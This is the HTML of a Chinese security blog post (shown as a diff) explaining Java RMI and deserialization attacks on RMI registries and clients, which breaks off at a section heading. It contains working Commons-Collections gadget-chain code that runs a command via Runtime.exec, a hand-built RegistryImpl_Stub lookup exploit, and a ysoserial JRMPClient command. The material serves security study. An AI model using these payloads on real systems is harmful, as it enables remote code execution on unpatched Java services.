@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Java反序列化中的RMI、JRMP、JNDI、LDAP - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期六, 五月 9日 2020, 11:40 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      28 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>No。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>Remote Method Invoke，翻译过来就是远程方法调用，从功能来说有点像远程 API 调用，客户端请求服务端提供的 API，服务器处理完成后将数据返回给客户端。</p>
+<p>在 RMI 中存在三个角色：注册中心、服务端以及客户端。</p>
+<p>在 RMI 的工作流程中，服务端编写一个继承了 Remote 类的接口以及一个继承了 UnicastRemoteObject 类的远程调用类，并在其中实现远程调用方法的逻辑代码，然后与注册中心建立 TCP 连接，将这个类实例化并注册到注册中心。客户端要调用服务端的远程方法时就会去访问注册中心，从注册中心处拿到服务端的信息，再调用服务端的远程方法。借用一张参考文章里面的图，流程大致如下：</p>
+<p><img src="/css/images/RMI_LDAP/2020050901.png" srcset="/img/loading.gif"></p>
+<p>一个简单的 RMI 使用测试代码如下，注册中心代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI Registry Start at port 1099&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RMIServerImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIServerImpl</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">call</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        registry.rebind(<span class="string">&quot;RMIServer&quot;</span>, <span class="keyword">new</span> <span class="title class_">RMIServer</span>());</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI Registry Start at port 1099&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RMIServer.java(远程方法)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, RMIServerImpl &#123;</span><br><span class="line">    RMIServer() <span class="keyword">throws</span> RemoteException&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Call!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Here is Server Test!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RMIServerImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIServerImpl</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">call</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">    <span class="type">RMIServerImpl</span> <span class="variable">service</span> <span class="operator">=</span> (RMIServerImpl)registry.lookup(<span class="string">&quot;RMIServer&quot;</span>);</span><br><span class="line">    System.out.println(service.call());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RMIServerImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIServerImpl</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">call</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在实际使用中，注册中心和服务端一般是放在一起的。</p>
+<h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><p>暂时不研究，所以只放个网络上的概念在这里。</p>
+<p>JRMP：Java Remote Message Protocol ，Java 远程消息交换协议。这是运行在 Java RMI 之下、TCP&#x2F;IP 之上的线路层协议。该协议要求服务端与客户端都为 Java 编写，就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范。</p>
+<h3 id="RMI-攻击方式"><a href="#RMI-攻击方式" class="headerlink" title="RMI 攻击方式"></a>RMI 攻击方式</h3><p>为了接下来的测试，可以在三个地方都加上 apache-commons-collections 3.2.1 的依赖。</p>
+<h4 id="服务端攻击低版本-JDK-注册中心"><a href="#服务端攻击低版本-JDK-注册中心" class="headerlink" title="服务端攻击低版本 JDK 注册中心"></a>服务端攻击低版本 JDK 注册中心</h4><p>在 RMI 的工作流程中，服务端要将一个对象绑定到注册中心，这个传输流程能让人想到什么？没错，就是 Java 序列化。</p>
+<p>我们可以抓包看一看绑定过程中的数据传输：</p>
+<p><img src="/css/images/RMI_LDAP/2020050902.png" srcset="/img/loading.gif"></p>
+<p>很明显是一段序列化数据，所以注册中心在接收到这段注册数据的时候自然也会进行反序列化，这就会导致一个反序列化攻击的入口。但是要攻击成功还是需要注册中心本地存在可利用的反序列化 gadget。</p>
+<p>接下来看看注册中心的注册流程，在调用 createRegistry 之后，会创建一个 ServerSocket 线程在该端口处监听 TCP 流量：</p>
+<p><img src="/css/images/RMI_LDAP/2020050903.png" srcset="/img/loading.gif"></p>
+<p>接收到数据后的处理代码在 executeAcceptLoop 函数中，不过这里不是这次的重点，重点的处理代码在之后的 handleMessages 函数中：</p>
+<p><img src="/css/images/RMI_LDAP/2020050904.png" srcset="/img/loading.gif"></p>
+<p>80 代表这是 Call 请求，服务端注册和客户端请求都是这个 transport op：</p>
+<p><img src="/css/images/RMI_LDAP/2020050905.png" srcset="/img/loading.gif"></p>
+<p>在 serviceCall 的调用中，后面会进入 RegistryImpl_Skel 类的 dispatch 函数，switch var3 后进行不同处理，var3 其实就是代表对注册中心请求种类的一个数字，rebind 函数发出的请求中 var3 就是 3，大概在流量包的这个地方：</p>
+<p><img src="/css/images/RMI_LDAP/2020050906.png" srcset="/img/loading.gif"></p>
+<p>或者也可以直接在源码中查看，rebind 以及 lookup 之类的方法定义都在 RegistryImpl_Stub 类中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rebind</span><span class="params">(String var1, Remote var2)</span> <span class="keyword">throws</span> AccessException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var3</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">3</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var4</span> <span class="operator">=</span> var3.getOutputStream();</span><br><span class="line">            var4.writeObject(var1);</span><br><span class="line">            var4.writeObject(var2);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到注册中心的处理来，在这里可以看到这里有一个反序列化操作：</p>
+<p><img src="/css/images/RMI_LDAP/2020050907.png" srcset="/img/loading.gif"></p>
+<p>在低版本 JDK 上，可以直接利用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> (Remote)Proxy.newProxyInstance(RMIServer.class.getClassLoader(), RMIServer.class.getInterfaces(), annotationInvocationHandler);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">registry.rebind(<span class="string">&quot;Hack&quot;</span>, remote);</span><br></pre></td></tr></table></figure>
+
+<p>因为 rebind 需要第二个参数是 Remote 类型的，所以用动态代理转换一下，动态代理的第一个参数可以随意，反序列化攻击的过程不需要用到动态代理，第二个参数因为要转换成 Remote 类型所以需要 Remote，可以 getInterfaces 也可以直接 new Class[]{Remote.class}。</p>
+<p>也可以直接使用 ysoserial 的 JRMPClient：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-0</span>.<span class="number">0.6</span><span class="literal">-SNAPSHOT-all</span>.jar ysoserial.exploit.JRMPClient <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">1099</span> CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+<p>这个 payload 跟一般的服务端注册中心交互不同，走的是 DGC，具体我也没仔细研究过，不懂。高版本 JDK 中这里的反序列化会经过 DGCImpl 类里面 checkInput 方法的过滤，所以无法使用。</p>
+<p>而同样的如果在高版本 JDK ( &gt;&#x3D; jdk8u121 )上面用 commons-collections 的 payload 去测试 rebind，会发现触发了一个反序列化白名单 WAF：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+<p>所以 gadget 基本上都用不了了，要寻找其他方法。</p>
+<p>顺带一提的是，除了 rebind，在低版本 JDK 里面 bind 和 unbind 都是可以触发反序列化操作的，所以都可以用来攻击注册中心，而高版本 JDK 的 unbind 处理中将 readObject 改成了 readString，所以无法利用。bind 的攻击流程与 rebind 类似，而 unbind 的参数是 String 所以无法直接使用，攻击流程可以参考下面客户端使用 lookup 攻击。</p>
+<h4 id="客户端攻击低版本-JDK-注册中心"><a href="#客户端攻击低版本-JDK-注册中心" class="headerlink" title="客户端攻击低版本 JDK 注册中心"></a>客户端攻击低版本 JDK 注册中心</h4><p>客户端 lookup 的源码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var15);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        Remote var20;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var20 = (Remote)var4.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var13) &#123;</span><br><span class="line">            var2.discardPendingRefs();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var13);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        	<span class="built_in">this</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var20;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面的 readObject 可能会导致的客户端被反序列化攻击先不提，我们可以看到 lookup 方法的操作码是 2，而注册中心同样会对这种操作进行反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var10 = var2.getInputStream();</span><br><span class="line">        var7 = (String)var10.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>所以理论上也可以通过客户端 lookup 攻击注册中心，只是有一个问题，lookup 方法的参数是 String，也无法使用代理，所以不能直接构造 payload。不过我们可以把 lookup 的代码提取出来进行攻击：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line">Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID), <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>), <span class="literal">false</span>);</span><br><span class="line"><span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef);</span><br><span class="line"><span class="type">RegistryImpl_Stub</span> <span class="variable">registryImpl_stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl_Stub</span>(ref);</span><br><span class="line"><span class="type">StreamRemoteCall</span> <span class="variable">streamRemoteCall</span> <span class="operator">=</span> (StreamRemoteCall)registryImpl_stub.getRef().newCall(registryImpl_stub, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">objectOutput</span> <span class="operator">=</span> streamRemoteCall.getOutputStream();</span><br><span class="line">objectOutput.writeObject(annotationInvocationHandler);</span><br><span class="line">registryImpl_stub.getRef().invoke(streamRemoteCall);</span><br></pre></td></tr></table></figure>
+
+<p>后面会因为强制转换为 String 而报错，不过没有关系，命令已经执行了。而在高版本 JDK 中（具体不知道是哪个版本），除了白名单 WAF 之外，case 2 的 readObject 反序列化操作会变成 readString，所以这种方式就无法使用了。</p>
+<h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p>就像上面看到的一样，客户端 lookup 会反序列化注册中心发回的数据，注册中心就可以以此攻击客户端。</p>
